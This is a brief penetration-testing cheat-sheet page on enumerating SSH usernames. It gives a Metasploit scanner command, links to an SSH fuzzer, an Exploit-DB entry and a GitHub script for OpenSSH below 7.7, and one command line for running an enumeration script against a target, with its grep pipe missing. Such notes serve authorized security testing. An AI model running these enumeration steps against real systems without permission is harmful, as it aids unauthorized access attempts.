---
cover: ../.gitbook/assets/SSH Penetration Testing.png
coverY: 0
---

# Usernames

```
msf> use scanner/ssh/ssh_enumusers
```

```
# SSH FUZZ
# https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt
```

```
```

## Enum users < 7.7:

{% embed url="https://www.exploit-db.com/exploits/45233" %}

{% embed url="https://github.com/CaioCGH/EP4-redes/blob/master/attacker/sshUsernameEnumExploit.py" %}

```
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/nullgrep "is a"
```
